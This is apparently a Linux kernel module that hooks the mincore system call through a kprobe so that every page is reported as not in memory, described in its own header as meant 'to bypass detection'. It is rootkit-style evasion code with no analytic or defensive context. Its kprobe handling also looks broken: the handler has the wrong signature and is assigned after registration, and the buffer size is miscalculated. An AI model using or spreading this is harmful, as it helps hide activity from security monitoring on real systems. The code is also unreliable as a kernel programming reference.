#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/mutex.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Hook mincore syscall to bypass detection");

static struct kprobe kp = {
    .symbol_name = "sys_mincore",
};

static DEFINE_MUTEX(mincore_mutex);

static asmlinkage long (*original_mincore)(unsigned long start, size_t len,
                                           unsigned char __user *vec);

static asmlinkage long hooked_mincore(unsigned long start, size_t len,
                                      unsigned char __user *vec)
{
    long ret;
    unsigned char *fake_vec;

    mutex_lock(&mincore_mutex);

    fake_vec = kmalloc(len / PAGE_SIZE, GFP_KERNEL);
    if (!fake_vec) {
        mutex_unlock(&mincore_mutex);
        return -ENOMEM;
    }

    memset(fake_vec, 0, len / PAGE_SIZE); // Set all pages to "not in core"

    ret = copy_to_user(vec, fake_vec, len / PAGE_SIZE);
    kfree(fake_vec);

    mutex_unlock(&mincore_mutex);

    if (ret != 0) {
        return -EFAULT;
    }

    return 0;
}

static int __init mincore_hook_init(void)
{
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("register_kprobe failed, returned %d\n", ret);
        return ret;
    }

    original_mincore = (void *)kp.addr;
    kp.pre_handler = (kprobe_pre_handler_t)hooked_mincore;

    pr_info("mincore syscall hooked\n");
    return 0;
}

static void __exit mincore_hook_exit(void)
{
    unregister_kprobe(&kp);
    pr_info("mincore syscall unhooked\n");
}

module_init(mincore_hook_init);
module_exit(mincore_hook_exit);
